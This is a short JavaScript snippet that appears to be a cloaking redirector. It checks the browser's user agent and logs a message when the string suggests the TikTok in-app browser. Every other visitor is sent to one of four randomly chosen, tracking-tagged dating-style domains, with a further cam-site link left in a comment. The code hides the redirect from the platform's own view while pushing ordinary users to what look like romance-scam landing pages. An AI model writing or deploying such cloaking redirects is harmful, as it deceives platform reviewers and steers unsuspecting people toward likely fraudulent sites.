let agent = navigator.userAgent;

const urls = [
  'https://ohmyhoney-datingnew.life/?u=13bk60m&o=0rygz59',
  'https://phf2hrh.ohmyhoney-datingnew.life/e6yb3el',
  'https://phf2hrh.myromancedate-hub.top/e64gxw7',
  'https://myromancedate-hub.top/?u=13bk60m&o=0rupv4g',
];

function getRandomIndex(max) {
  return Math.floor(Math.random() * max);
}
const randomIndex = getRandomIndex(urls.length);
const chosenUrl = urls[randomIndex];

if (agent.indexOf('music') >= 0) {
  console.log('in tiktok app');
} else {
  window.location = chosenUrl;
  //  window.location = 'https://watchmenow.cam/';
}
// document.querySelector('body').innerText = agent;
